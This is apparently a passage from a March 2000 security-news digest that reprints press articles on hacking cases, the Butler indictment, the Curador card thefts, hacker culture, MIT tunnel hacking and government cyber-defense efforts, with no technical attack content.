      at the Rand Corporation calls the current state of electronic
      offerings. Libicki sees a technology harvest that will eventually reap
      true military benefits, but for now, he says: "If you are going to be
      an adult, you've got to go through it, zits and all."
      
      Libicki has been worrying about ways to ensure that if soldiers are
      ever captured with their gizmos, systems will not be compromised. "I'm
      worried about the guy who finds himself on the wrong side of an
      AK-47," he says. If the enemy were to gain access to the American
      tactical picture through a hand-held device or laptop, they could
      learn gaps in intelligence and "blue" (i.e., U.S. military)
      vulnerabilities.
      
      Thus Libicki has developed some ideas to ensure network security for
      the inherently vulnerable battlefield systems. There is his "GPS
      lock-out" idea, a $200 module could be added to hand-held devices to
      incorporate a global positioning satellite system. If the device is
      reported behind enemy lines, the module assumes it has been captured
      and shuts down the device down awaiting resynchronization.
      
      Then there is "dual password," which would allow a prisoner of war to
      key in a fake password to unlock his laptop for enemy interrogators.
      But the back-up password would bring up false data on the screen that
      would seem plausible. It would also send a signal to the mother ship
      that the unit has been lost. Libicki has even conceived of an
      artificial intelligence program that could monitor keystrokes and thus
      stress to determine that a machine is still functioning under normal
      circumstances.
      
      Adding without a Calculator
      
      Though Libicki is palpably excited by his engineering challenges, he
      also asks some pointed questions. Does any soldier who has the
      potential to be captured really need a laptop? In a world where you
      can see the enemy from far away, do soldiers even need to close in on
      the enemy? Are we just building the systems for "a high-tech
      Gettysburg," Libicki asks?
      
      "The only time you want to get in and amongst the enemy is when there
      is no choice," he says.
      
      Laptop computers that can survive a nuclear war? Notebooks that can
      operate on the front lines? Hand-held devices on enclosed ships and
      submarines? Obviously there is potential for excess here.
      
      Beyond the question of waste though, there is the matter of
      practicality. Proliferation of personal devices ensure better
      communication, record keeping, and access to information. But when
      systems fail, will military people still know the skills to use the
      old grease pencil? I for one have been writing with a word processor
      for almost 20 years, and frankly I've lost my ability to write
      anything beyond a grocery list in long hand.
      
      Isn't war too important to be left to the laptop?

      FBI Computer Expert Accused of Hacking
      Henry K. Lee, Chronicle Staff Writer
      Friday, March 24, 2000
      2000 San Francisco Chronicle

      Max Ray Butler seemed to be at the top of his game. For two years, the
      computer expert was a confidential source for an elite FBI computer crime
      squad, helping to ferret out scofflaws on the Internet. 
      
      Butler, also known as Max Vision, was also a self-described ``ethical
      hacker'' from the Silicon Valley who boasted that he could test the
      security of any computer system by penetrating it. 
      
      But Butler's cyber activity went too far, federal authorities say. 
      
      Butler, 27, of Berkeley appeared in federal court in San Jose yesterday on
      a 15-count federal indictment charging him with hacking into computers
      used by the University of California at Berkeley, national laboratories,
      federal departments, air force bases across the country and a NASA flight
      center. 
      
      Butler posted $50,000 cash bail yesterday after U.S. Magistrate Judge
      Patricia Turnbull ordered him not to use computers except for work. Butler
      and his attorney, Jennifer Granick of San Francisco, could not be reached
      for comment. 
      
      The indictment, handed down March 15, said Butler caused ``reckless
      damage'' as a result of intrusions in May 1998. Butler was also charged
      with possession, with intent to defraud, of 477 passwords belonging to
      customers of a Santa Clara- based Internet service provider. 
      
      The case underscores the potential risks involved when law-enforcement
      agencies use confidential informants with access to sensitive information. 
      
      ``Sources are often very close to criminal activity, and sometimes they
      cross the line,'' said Special Agent George Grotz, an FBI spokesman in San
      Francisco. 
      
      Grotz declined to say how Butler became an FBI informant and whether he
      was a federal source at the time of the alleged crimes. Grotz said Butler
      is no longer associated with the agency. 
      
      Friends of the suspect told the Associated Press that Butler was caught
      possibly violating the law several years ago and began working with the
      FBI to avoid charges. Seth Alves, 27, told the news agency that Butler was
      unfairly targeted after refusing to comply with an FBI request. 
      
      A 22-month investigation by the FBI and military investigators ended
      Tuesday morning when federal agents converged on a home on Dwight Way near
      the UC Berkeley campus, where Butler lives with his his 23-year-old wife,
      Kimi Winters. No one answered the door. Butler turned himself in to the
      FBI in Oakland later that day. 
      
      Butler grew up in Idaho and lived with his family in Washington, where
      authorities said he has a 1997 misdemeanor conviction for attempted
      trafficking of stolen property. 
      
      He developed a proficiency with computers, eventually attracting the
      attention of the FBI's Computer Crime Squad, which used him as a
      confidential informant. 
      
      An FBI search warrant affidavit said Butler was ``well known'' to squad
      members and ``has provided useful and timely information on computer
      crimes in the past.''
      
      In 1997, Butler started a company known as Max Vision in Mountain View,
      specializing in ``penetration testing'' and ``ethical hacking'' procedures
      in which he would simulate for clients how a hacker would penetrate their
      computer systems, according to the company Web site. 
      
      ``Our client penetration rate is currently 100 percent,'' the site said,
      with recent clients including a large consortium of telecommunications
      companies, a major motion picture company and an e-commerce online auction
      service. 
      
      By 1998, Butler was living with Winters in a one-story San Jose apartment,
      where the couple started up their own Web-design company, Kimi Networks,
      records show. Reached by telephone yesterday, Winters hung up on a
      Chronicle reporter. 
      
      It was also from that apartment, according to the FBI, that Butler hacked
      into computers by using a computer software vulnerability known as a
      buffer overflow, which sends commands into a system that ordinarily would
      not be allowed. 
      
      Butler also allegedly invaded computers used by the Lawrence Berkeley
      National Laboratory. Vern Paxson, a computer scientist at the lab, noticed
      an online intruder conducting unauthorized scans of laboratory and UC
      Berkeley computers in May 1998 and used a monitoring device that later
      helped identify the source of the intrusions. 
      
      Paxson said yesterday that Butler's arrest was ``somewhat ironic'' but
      ``not totally surprising.''
      
      Paxson said a person later identified as Butler even sent him an
      apologetic e-mail a day after the computer intrusions. Butler also somehow
      obtained a confidential incident report Paxton had filed about the
      invasions, Paxson said.

230.0 ISN:Disney and Miramax Sued for 'Hacking'
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Wednesday March 29, 8:09 am Eastern Time
      Company Press Release
      Disney and Miramax Sued for 'Hacking'
      Parts of 'The Fugitive Game' Allegedly Stolen For New Movie
      
      SAN FRANCISCO--(BUSINESS WIRE)--March 29, 2000--The Walt Disney Company
      and its Miramax division have made a computer hacker movie that ``hacked''
      the author's book without paying or giving credit to the writer, according
      to a lawsuit filed yesterday by Bartko, Zankel, Tarrant & Miller, a law
      firm representing best-selling author Jonathan Littman.
      
      Littman's suit alleges that the Disney/Miramax/Dimension Films production
      of the movie Takedown, which premiered earlier this month in 29 theatres
      in Paris, France, was based in large part on lifted segments of Littman's
      book, The Fugitive Game. Littman's book, published in 1996, is based on
      the celebrated capture of computer hacker Kevin Mitnick, who was billed at
      the time as the world's most notorious and dangerous ``cyberterrorist.''
      
      ``Jonathan Littman carefully researched the reality of the computer hacker
      underworld,'' said his lawyer Bill Edlund. ``His book articulated and
      supported his view that Kevin Mitnick was not the premeditated, greedy and
      destructive criminal portrayed by some of the media. Readers and critics
      received Littman's The Fugitive Game as a more in-depth presentation and
      entertaining expose of the flawed Mitnick prosecution than the overblown,
      self-interested media hype.''
      
      The Fugitive Game shows Mitnick to be not a terrorist, but a computer
      hacker, in part a misguided victim of a government entrapment effort that
      used a sleazy informant to lure Mitnick into hacking. A key element of
      Littman's book is his examination of the media hype spurred in New York
      Times articles by reporter John Markoff about the Mitnick story.
      
      Littman also questions Markoff's presentation of Tsutomu Shimomura, a
      computer security specialist who used hacking techniques similar to
      Mitnick's to trace Mitnick to his hideout in North Carolina.
      
      Shimomura and Markoff wrote their version of these events in their book
      Takedown, released at the same time as Littman's book. The book is based
      on the seven-week pursuit of Mitnick by Shimomura that led to Mitnick's
      arrest in February of 1995. The Disney organization purchased the book and
      movie rights to Takedown and have now released their movie version, hiring
      a cast that included lead actor Skeet Ulrich and screenwriters led by John
      Danza.
      
      ``The screenwriter could not shape the story told in the book Takedown
      into a workable script,'' said Edlund. ``Once the movie project began to
      flounder, Danza and other screenwriters lifted most of the first part of
      Littman's The Fugitive Game for the storyline and start of the movie
      Takedown. Littman's lawsuit is backed by e-mails allegedly sent by Danza.
      In the e-mails, the screenwriter admits that it was 'unfortunate' that
      Disney did not option the rights to the book The Fugitive Game to make the
      movie Takedown. Danza goes on to describe his desire to use Littman's
      insider information and parts of Littman's book in order to try and
      salvage the movie project.''
      
      The complaint presents a detailed comparison between Littman's book and
      the final shooting script for the movie Takedown, allegedly illustrating
      repeated and compelling similarities between the two. According to the
      allegations, the film Takedown and The Fugitive Game both open with a
      scene in a strip club frequented by a government informer who reveals to
      Mitnick information about ``SAS'' -- a secret Pacific Bell phone-tapping
      system that Mitnick subsequently breaks into and uses.
      
      Littman's lawsuit also contends that various themes and interpretations
      from his book that are absent from the book Takedown appear in the movie
      version of Takedown, including the government informer and entrapment of
      Mitnick, and the pressure on the government to capture Mitnick created by
      exaggerated media hype.
      
      Littman seeks to prevent Disney, Miramax and the other defendants from
      continuing to violate his copyrights by distributing the movie and to
      recover his damages and the wrongful profits that defendants obtained from
      the alleged theft of his work. Littman's lawyers say that the
      Disney-Miramax plagiarism tainted Littman's work by patching it into their
      motion picture.
      
      Because of this, he is also asking for damages that he claims resulted
      from opportunities he lost, including the opportunity for involvement with
      other movie projects based on The Fugitive Game.

      Last Updated: March 28, 2000
      
      A hacker cracked into Marquette University's Web site early Tuesday,
      replacing the school's home page with a false front concerning Al
      Gore's speech at the college.
      
      The fake Web page posted false quotes about the vice president's
      address to the university Monday, claiming among other things that
      Gore said he plans to "rid this country of anyone who might question
      my motives, starting with deporting all Christians."
      
      John Hopkins, vice president for communications at Marquette
      University, said the school's information technology staff detected
      attempts to break into the network Monday morning and disconnected the
      college's link to the Internet so they could deal with the attacks.
      
      The school's link was restored around 5 p.m. Monday, and sometime
      between then and 1 a.m. Tuesday, a hacker broke in and replaced the
      school's Web page. Marquette's Web page was back to normal by around
      1:30 a.m. Tuesday.
      
      "Our IT people are working through this and figuring out what
      happened," Hopkins said. The fake home page "was up for a relatively
      limited period of time, and that time was early in the morning. I
      don't think very many people saw it."
      
      Brian Manganello, an FBI special agent, said Marquette officials
      contacted them about the attack, but he declined to comment further.
      
      "We were informed that external attempts were made to compromise their
      computer networks," he said. "We're investigating the matter."
      
      John Gapinski, chief operating officer for Sun Tzu Security Ltd., a
      technology security company in Milwaukee, said that if the hacker got
      administrative access to the school's network servers, the college
      could develop all kinds of problems.
      
      The computer intruder may have stashed viruses or other malignant
      programs for later use on the school's computers, he said.
      
      "It would be prudent for them to audit their
      systems," he said. "You can't necessarily trust anything now."

232.0 ISN:Bennett leads cyber defense

      MY mother makes me wear these clothes.

      Utah senator fears U.S. will be attacked by computer hackers
      
      By Lee Davidson
      Deseret News Washington correspondent
      
      WASHINGTON Sen. Bob Bennett was appointed Monday to head a new Senate
      group designed to be a central clearing house for information on how
      to combat cyber-attacks.
      
      That comes after Bennett, R-Utah, said last week that he fears the
      next world war will not be fought with tanks and missiles, but by
      enemy hackers attacking the nation's computers to crash everything
      from the nation's utilities to its banking.
      
      Bennett also headed a similar committee that oversaw combating the
      Year 2000 computer glitch. His new Critical Infrastructure Protection
      Working Group emerges largely to address threats warned about by the
      earlier Y2K committee.
      
      Senate Majority Leader Trent Lott, R-Miss., said he formed the group
      and named Bennett to head it because "recent hacker attacks on major
      e-commerce and government Web sites demonstrate the importance of
      information security."
      
      Bennett said, "The interconnectivity and advanced capabilities of U.S.
      computer systems makes the United States more vulnerable to
      cyber-attacks than any other nation in the world. Such attacks could
      bring the U.S. economy to its knees."
      
      He added, "The CIP Working Group will serve as a central repository
      for this information and coordinate efforts to increase national
      awareness."
      
      Also appointed to the group were senators who chair regular committees
      that share some jurisdiction over the problem including Judiciary
      Committee Chairman Orrin Hatch, R-Utah.
      
      Others include senators who chair the Banking, Commerce, Foreign
      Relations, Commerce, Energy, Intelligence, Appropriations,
      Environmental, Governmental Affairs and Armed Services committees,
      plus a few additional senators.
      
      Just last week, Bennett told a symposium on cyber-security that
      lessons learned from fighting Y2K problems showed him how vulnerable
      America is to an attack via computer hacking.
      
      "The most vulnerable country in the world to this kind of attack is
      the United States of America because we have the most advanced
      capabilities," he said.
      
      Bennett added that because computer systems are now so interconnected,
      "a cyber-attack one place can bring down services in all the other
      places in the world."
      
      He said the major threat would be if "a possible major state . . .
      would develop the resources for a concentrated, continuing and
      sophisticated attack over time" via computer hacking.
      
      Bennett added, "In my opinion, the next war will be this target rather
      than the traditional" weapons of war.

      NEW YORK (March 28, 2000 2:20 a.m. EST http://www.nandotimes.com) -
      When Simple Nomad was younger, one of his favorite pastimes was
      worming his way into phone companies' computer systems. That was more
      than 10 years ago, before words like "Internet" and "hacker" were key
      words in the cultural lexicon - and before it was against the law.
      
      "I liked to take things apart and see how they worked, he says. "In
      that way, I'm considered 'old school.'"
      
      Getting around a computer system's security and exploring its
      technological nuance is part of the thrill of the pseudonymous world
      of the hacker underground, a relatively young cyberspace culture where
      computer programmers like Simple Nomad are driven to demonstrate their
      own technological skills.
      
      For many, the term "hacker" conjures up images of a precocious
      troublemaker smirking as he toys with the technologically challenged.
      Indeed, sometimes what the hacker underground sees as exploring,
      companies call trespassing.
      
      But hackers see a difference between their love of exploration and
      computer showmanship and recent attempts to shut down Web sites and
      steal credit-card information. They see themselves as pioneers, ones
      who are helping computer culture and science evolve - as opposed to
      the thieving (and amateur) tactics of those they derisively call
      "crackers."
      
      But as the Internet evolves into a giant superstore, the lines between
      black and white are blurring further. The hacking underground has a
      libertarian ethos that places a high value on the free flow of
      information. As a result, hackers often post techniques that can be
      used to crack system security. They argue that unauthorized hacks into
      systems are the only way allow security techniques - as well as
      technology - to fully evolve.
      
      "I'll be the first to admit there are a lot of gray areas," says
      Simple Nomad, who runs Nomad Mobile Research Centre, a Web site that
      provides information on the security flaws in computer systems. "I've
      written tools that I know can be used for people to test their system,
      but I also know someone can turn around and use the same tools to
      break into a system."
      
      In the mid 1990s, as many in the Internet industry began clamoring for
      ways to protect against these intrusions, Congress passed legislation
      that made hacking a crime. Last week, Max Vision, the hacking alias of
      Max Ray Butler, was held on $100,000 bail after being indicted for
      breaking into government systems including NASA and the Department of
      Defense.
      
      The hacker community, however, bristles at being lumped with acts like
      last month's "denial of service" attacks against Internet behemoths
      like Yahoo! and eBay, attacks that lacked the technological
      sophistication they value. Many have tried to distinguish hackers from
      "black hats" or "crackers," who crack into systems to steal credit
      card information or do some kind of damage.
      
      "A lot of the underground isn't looking at this as a major hack, or
      even as a genuine act of hacking," says Space Rogue, editor of Hacker
      News Network and a computer scientist for security consortium
      @stake.com.
      
      A. Anonymous, a former "black hat" hacker who wrote the best-selling
      book "Maximum Security," was one of the first to give detailed
      information on how to crack a system's security. "All these other
      security books, not one of them taught you how to break into
      anything," he says. "But because there are standard things you must do
      to secure your system, you first need to know how the attacks work."
      
      Some of the roots of hacking come out of the "phone phreaking" of the
      1970s.
      
      According to the Hackers' Hall of Fame, the hacker Cap'n Crunch became
      a legend when he figured out how to reproduce the tone that authorizes
      long-distance service with a toy whistle from a cereal box. Later,
      many people - mostly kids - manipulated pay-phone wires with a paper
      clip to get "free" long-distance. As networks connected by phone wires
      began to evolve, so did the various ways to furtively plug into them.
      
      As young hackers explored the source code of systems, they began to
      think of ways to do it better. The result was a highly competitive
      community where, like playground basketball, a hacking "star" performs
      exploits that could become legendary.
      
      "When something is posted, immediately that motivates some people to
      want to do something better," says A. Anonymous. "As a result, ideas
      are being exposed to an evolution at an extremely rapid pace."
      
      Though Simple Nomad says he no longer breaks into systems, he notes
      that his Web site is listed as criminal on most Web-blocking software.
      "Which is unfortunate," he says, "because 9 out of 10 e-mails I get is
      from a system administrator saying 'Thank you, I used the stuff on
      your site to take care of my system.'"
      
      More and more, Internet security companies are using the techniques of
      the hacker underground to make systems more secure. And many of the
      old phone phreakers and black-hat crackers are being hired. "You stick
      with it long enough," says A. Anonymous, "and you shed the purple hair
      and put on a suit and tie."

234.0 ISN:Curador worked as e-commerce consultant.
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      http://www.internetnews.com/ec-news/article/0,2171,4_328071,00.html
      
      Before he was arrested by police in Wales last Thursday, the online
      credit card thief who called himself "Curador" worked as an e-commerce
      consultant, his former boss revealed Monday.
      
      As previously reported, an 18-year-old man in Clynderwen, Wales was
      arrested Thursday in connection with break-ins at nine e-commerce
      sites in recent weeks. Under U.K. law, Curador's name was not released
      by police, but the Britain's Daily Telegraph reported Saturday that
      Curador's real name was Raphael Gray. The true name of his accomplice,
      who was also arrested, was not disclosed.
      
      While he was allegedly breaking into online stores in the United
      States, Canada, Thailand and Great Britain, Gray was also working to
      develop an e-commerce strategy for Console King, a mail-order company
      in Narberth, Wales.
      
      According to Sam Lee, managing director, the retailer of video games
      and DVDs hired Gray around Christmas 1999 on the recommendation of a
      job recruitment firm.
      
      "[Gray] told us that he worked for several companies, including a
      subsidiary of Microsoft. And he showed us some of the work he had
      done, and it was pretty good. As far as we knew, he had no criminal
      record," said Lee.
      
      Console King paid Gray about US$6.50 to build the company an online
      storefront. But Lee said he fired Gray in the beginning of March after
      Gray began failing to show up for work. Only last week did Lee know
      that Gray had allegedly been involved in the online theft of about
      26,000 credit cards over the course of six weeks.
      
      "We couldn't believe it. He's put my company and my staff in jeopardy.
      He's so stupid he doesn't know what he's done," said Lee, who added
      that Console King has tightened security at its site since learning of
      Gray's true identity.
      
      Gray has been released on bail and according to Lee has been seen on
      the streets of Clynderwen, which has a population of 550.
      
      FBI officials declined to comment on whether Gray had used any of the
      stolen card numbers to place fraudulent orders. Britain's Daily Mail
      newspaper quoted a detective who said police had confiscated "a pile
      of stuff" from the homes of Gray and his accomplice.
      
      Gray also apparently used a card stolen from an online retailer named
      Albion's MO to register one of the sites where he posted stolen card
      numbers and diatribes about e-commerce security. According to Robert
      Koseluk of Carmel, Indiana, he received an unauthorized charge for
      $198 to register and set up a site at free-creditcard.com. Gray also
      apparently used a card stolen from Stacy Yaple of Jacksonville, Fla.,
      to register another site, e-crackerce.com.
      
      Lee of Console King said that Gray apparently had financial problems.
      Lee also said Gray would often borrow small amounts of money from him.
      
      "He never had any money. I had to lend him money for a haircut and for
      lunch. He came into work stinking and wore the same clothes everyday.
      I had to speak with him about his personal appearance and hygiene,"
      said Lee.
      
      At his Web sites, Gray has argued that he broke into other sites to
      shame operators into improving their shoddy security. Tim Ward, owner
      of feelgoodfalls.com, a site that Curador hit around the end of
      February, said Curador has had his desired effect.
      
      "There's some good that came out of this. We never intended to expose
      anybody's card numbers, but what he did resulted in us being more
      secure," said Ward, who revealed that his mother-in-law built the site
      at feelgoodfalls.com using Microsoft StoreFront. In the wake of the
      break-in, Ward has hired a security consulting firm to batten down the
      hatches.
      
      Michael Vatis, director of the FBI's National infrastructure
      protection center, said Friday that regardless of a cracker's motives,
      breaking into a site is still a federal crime.
      
      "If someone gains unauthorized access to a computer that's engaged in
      interstate or foreign commerce, that access is a federal crime,
      whether the state of security is poor or excellent," said Vatis.
      
      Reuters reported Sunday that one of the credit cards that Curador had
      stolen belonged to none other than Microsoft Chairman Bill Gates. The
      report apparently was based on information gleaned from one of
      Curador's Web sites where he posted stolen credit card numbers.
      
      But that site, which is mirrored here, contains information suggesting
      the Reuters report is inaccurate. For example, the credit card number
      Curador posted and claimed was Gates' has only 12 digits, and the
      first four do not match any algorithms used by Visa, Mastercard,
      Discover, American Express, or any of the other major credit card
      companies.
      
      A spokesperson for the U.S. Secret Service, which investigates credit
      card fraud, would not comment on Curador's claims, although he did say
      that the card appeared to be missing numbers.

235.0 ISN:White house official charged with spreading phone codes
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      http://dailynews.yahoo.com/h/nm/20000327/tc/crime_whitehouse_1.html
      
      By Gail Appleson, Law Correspondent
      
      NEW YORK (Reuters) - A U.S. Army sergeant has been charged with giving
      out long distance White House telephone access code information that
      allowed individuals to charge some 9,400 calls worth $50,000 to the
      federal government, prosecutors said on Monday.
      
      David Gilmer, who was assigned to the White House Communications
      Agency, was arrested late Friday in Virginia on a criminal complaint
      filed in Manhattan federal court that alleged the calls were made over
      the last few months.
      
      The WHCA provides telephone service to Executive Branch agencies and
      departments including the President, Vice President, White House
      Senior Staff, National Security Council, U.S. Secret Service and
      others as directed by the White House Military Office.
      
      AT&T provides the long-distance phone service for the WHCA.
      
      No information was immediately available on the identities of those
      who used the information or if Gilmer made any profits from giving it
      out.
      
      The White House said Gilmer is no longer attached to the
      Communications Agency but had no further comment on the matter.
      
      Prosecutors said those involved in the scheme were able to use the
      White House code in much the same way consumers use telephone calling
      cards. However, in this case the WHCA was billed for the calls instead
      of the users.
      
      According to court papers, individuals called a WHCA toll-free number
      and entered a numerical code. They then heard a dial tone and were
      able to make long distance calls.
      
      AT&T told investigators that about 9,400 unauthorized calls were made
      between about Dec. 5, 1999, and Feb. 8. Some of these calls were made
      from phones in New Jersey and New York City. WHCA was billed about
      $50,000 for the calls.
      
      AT&T and Bell Atlantic provided authorities with subscriber
      information for several of the residential and business telephone
      lines on which the calls were made and search warrants were obtained
      for those properties.
      
      In searching one of the New Jersey properties, agents said that said
      one individual admitted using the WHCA toll-free number and code since
      September 1999.
      
      The unidentified individual allegedly told authorities the information
      came from Gilmer. According to court papers, the individual had
      Gilmer's business card identifying him as an employee of the WHCA
      assigned to the Presidential Communications division.
      
      On March 17 the individual consented to be taped by federal agents
      when that individual called Gilmer. The individual asked Gilmer for
      another WHCA code to avoid being billed for a long distance call.
      Gilmer allegedly provided the code.
      
      The individual made a second taped call on March 22 and during the
      conversation Gilmer allegedly admitted giving access codes to other
      individuals.

236.0 ISN:Hackers hold conference in Israel
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://www.lasvegassun.com/sunbin/stories/tech/2000/mar/30/033000707.html
      
      JERUSALEM (AP) [3.30.2000] -- Hackers from around the world overcame
      interrogations, censorship and an all-around bad image to hold
      Israel's first hacker convention, wrapping up the two-day conference
      Thursday without a glitch.
      
      The 350-strong gathering was the first of its kind since the Yahoo!
      and eBay commercial sites were crippled in February, reminding
      companies across the globe of the dangers hackers can pose.
      
      At the request of lawmakers, Israeli police had considered banning the
      conference, but Attorney General Eliyakim Rubinstein gave the
      go-ahead.
      
      One of the original hackers, John Draper of Fremont, Calif., said the
      hackers wanted to put a better face on the practice.
      
      "A hacker is a person who is developing programs to make them better,"
      Draper told The Associated Press. "They aren't the kind of people who
      break into computer systems. That's a cracker."
      
      Draper, known by the handle "Captain Crunch," helped launch the hacker
      phenomenon. In 1971, he discovered that a toy whistle from a cereal
      box reproduced the tone needed to open a free telephone line.
      
      Aware of his fame, Israeli security agents at the Los Angeles airport
      interrogated Draper for an hour, he said, and thoroughly searched his
      computer equipment before allowing him on the plane.
      
      "There were many attempts to silence us on this," organizers said in a
      summary of the gathering, released on their Web site.
      
      Police prevented the organizers from publishing one of the results of
      the conference: a list of vulnerable Israeli commercial Web sites.
      
      To compile the list, participants played "HackTheseSites" with sites
      offered up by Israeli companies. The site owners were confident no one
      could thwart them, but they were wrong.
      
      When they weren't eating pizza or guzzling soda, the hackers sat bent
      over their computer screens. They discovered that 28 percent of the
      Israeli net is vulnerable -- about the same proportion as the rest of
      the world, according to organizers.
      
      Police were invited to attend the conference and even to speak, but
      they turned down the offer, creating the game "Spot the Fed."
      
      Participants were given the challenge of finding plainclothes
      policemen among them. If a person pointed out as suspicious was in
      fact a security official, the official was to get an "I am the FED"
      T-shirt, and the spotter an "I spotted the FED" shirt. But none were
      found out.
      
      Israeli lawmaker and former Science Minister Michael Eitan accepted an
      invitation to attend. He said that hacker games like those displayed
      at the conference were meant more to entertain ambitious youngsters
      than cause harm.
      
      "I told them that as long as they all enjoy the freedom of the
      Internet and don't abuse this freedom, and make the public support
      police intervention, this will work," Eitan said in a telephone
      interview.
      
      Participants also got to speak to their guru -- convicted cyberbandit
      Kevin Mitnick -- in a conference call. The 36-year-old American
      bemoaned the strict probation terms that ban him from using a computer
      or any hi-tech device.
      
      Mitnick was released last year after serving five years in jail for
      breaking into the computer systems of some of America's biggest
      companies, including Motorola Inc., Novell Inc. and Sun Microsystems
      Inc.
      
      "He had a lot of sympathy in the room -- we all know not being able to
      touch a computer is a worse punishment than even being in jail," said
      Neora Shaul, a Tel Aviv computer programmer who helped coordinate the
      conference.

237.0 ISN:Old school MIT stylie "hacking" still makes news?
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://www.boston.com/dailyglobe2/090/metro/_Hackers_skirt_security_in_late_night_MIT_treks+.shtml
      
      By David Abel, Globe Correspondent, 3/30/2000
      
      CAMBRIDGE - Like shadows they scurry through the night, dressed in
      black, armed with head-mounted flashlights, walkie-talkies, ropes,
      pocketknives, lock -picking tools - and their student ID cards.
      
      They call themselves ''hackers.'' But these Massachusetts Institute of
      Technology students shouldn't be confused with those who sabotage
      computers. They have a more lofty goal: to bypass locked doors, slide
      through off-limits shafts and tunnels, and explore the bowels of
      campus buildings.
      
      Most Saturday nights, groups of less than a dozen students seek
      adventure by searching for anything from the fabled bricked-in shower
      to the Tomb of the Unknown Ladder.
      
      ''It's a lot like rock climbing or caving,'' said Jeremy Brown, 27, a
      computer science graduate student and veteran hacker. ''For us, it's
      about interrogating the environment, and learning from it.''
      
      But there's another, less appealing side of hacking: the danger. Last
      November a student was seriously injured after falling through a roof.
      
      Many of the hundreds of hackers are reluctant to talk about their
      underground pastime. They fear news reports will only push college
      officials to clamp down. ''You see, the more detail we give,'' Brown
      said, ''the more we're shooting ourselves in the foot.''
      
      Still, hacking is anything but a secret at MIT. If they haven't done
      it themselves, almost any student on campus could name a friend who
      has. In fact, during freshman orientation week every year,
      upperclassmen take large groups to tour the innards of MIT's
      infrastructure.
      
      But college officials insist that they don't turn a blind eye to what
      is known as ''roof and tunnel hacking,'' a variation or sometime
      precursor to another form of hacking: practical jokes. MIT students
      are famous for inventive pranks that require engineering finesse and
      are often done to coincide with April Fools' Day, such as placing a
      replica of a campus police cruiser atop the school's Great Dome.
      
      ''We definitely don't encourage it,'' said Lawrence S. Bacow,
      chancellor of MIT. ''We lock the roofs, we alarm doors, and we have
      fined students when they're where they shouldn't be. It's certainly
      not like we say, `Here's a roof; come climb on it.' Far from it.''
      
      With students routinely ignoring ''no entrance'' signs, groping their
      way through unlit pipe rooms, boiler tunnels, and high-voltage areas
      meant only for specially trained maintenance crews, safety has long
      concerned administrators.
      
      But the culture of hacking recently has come under increased scrutiny.
      About 3 a.m. on a Sunday morning in November, an 18-year-old woman
      plunged 96 feet down a chimney. The freshman from Pennsylvania, whose
      name MIT won't release, is recovering from major spinal cord injuries
      after falling off the roof of the Sloan School of Management building.
      
      While administrators say the student's injury is the worst hacking
      accident in memory, they know the college was very close to having a
      fatality - and they say they're doing everything in their power to
      stop it.
      
      ''One injury is one injury too many,'' Bacow said. ''We took this very
      seriously. She could have died - easily. She was lucky.''
      
      Even with fines of up to $500 for trespassing, improved locks and
      alarm systems, and constant admonishing by administrators, MIT hackers
      are not daunted. If anything, they say, they see the obstacles as a
      challenge to be overcome.
      
      ''A lot of hacking is about creativity, finding a way around a locked
      door or something,'' said a 22-year-old senior majoring in biology,
      who used to hack and asked that she not be identified. ''Hackers are
      generally students who question authority and don't pay attention to
      rules.''
      
      Yet hackers insist they consider safety paramount. Before taking out
      novices, usually recently recruited freshmen, they pass out laminated
      yellow cards titled, ''Hacking Ethics.'' The cards are also used as a
      way to open doors.
      
      The pithy precepts include: ''Don't drink and hack;'' ''Don't hack
      alone;'' ''Leave no permanent damage;'' ''Be subtle - leave no
      evidence that you were there;'' and contrarily, ''Don't steal
      anything, but if you must borrow something, remember to return it -
      perhaps leave a note saying when it will be returned.''
      
      But risks rise when hackers obey their 11th Commandment: Don't Get
      Caught. According to ''A Brief Guide to Hacking,'' part of a pamphlet
      published by MIT's Technology Communication Association and circulated
      to incoming freshmen, hackers ''shalt honor [the commandment] and keep
      it wholly.''
      
      After detailing specific evasion tactics - such as, ''always have two
      ways to run,'' or when fleeing, ''change floors often'' - the guide
      offers up these alibis if caught: ''Is this the way to Baker House?''
      or ''Where's the nearest bathroom?''
      
      Rarely, however, do students get caught in such a bind. According to
      MIT campus police, fewer than a dozen students a year are cited for
      hacking. Yet on any given night, as many hackers may be trolling
      through the Earth, Atmospheric, and Planetary Sciences building or the
      domes towering above the Infinite Corridor.
      
      ''It's a difficult thing to prevent,'' said Anne Glavin, chief of
      MIT's police force. ''First, this subculture is made up of secret
      associations, and they're not exactly inviting us in as guest
      speakers. The other thing is these are some of the brightest students.
      Staying ahead of them is a challenge. I mean, they are the ones who
      are going to be building the security systems in the future.''
      
      The phenomenon of students scoping steam tunnels or climbing through
      air ducts for fun reveals the peculiar environment of grouping some of
      the nation's smartest science-oriented students, administrators and
      alumni say.
      
      At the elite institution, where many of the students grow up taking
      pleasure more from solving a quadratic equation than in things like
      watching Sunday football, students often are eager to craft their own
      brand of entertainment.
      
      Throw in a dollop of curiosity and a bent toward ingenuity and you
      come up with students interested in hacking, according to Jeff Bigler,
      the former president of MIT Spelunkers club and now an alumnus who
      helps chronicle hackers' practical jokes.
      
      ''Really, what it comes down to is it's a way to hang out, and beats
      drinking beer and bad music,'' Bigler said. ''It's just exploring,
      hanging out together and having fun. It's like an outing club.''

238.0 ISN:US Census tests security

      Census tests security
      
      By Judi Hasson
      03/27/2000
      
      The Census Bureau has hired a company to try to break into its
      Internet site and brought in the super-secret National Security Agency
      to test Census security systems.
      
      Census officials said they are certain the data is safe but want to
      make sure there are no vulnerable spots.
      
      "Every day, people are scanning our ports. Its not just our site. Its
      any site, said J. Gary Doyle, who is responsible for systems
      integration at the Census Bureau.
      
      Among the steps that the Census Bureau has taken to protect the
      decennial count:
      
           * Hiring the technology firm Science Applications International
             Corp. to try to break into the Census Internet site, where
             respondents can file online. SAIC began working last week,
             and there have been no reports of successful entry into the
             site.
      
           * Enlisting NSA to make sure the site is secure.
      
           * Erecting firewalls to prevent penetration. Among the
             precautions: prohibiting e-mail from entering the site
             unless there is a specific address on it and barring
             outside computers from dialing up the census computer
             in the building.
      
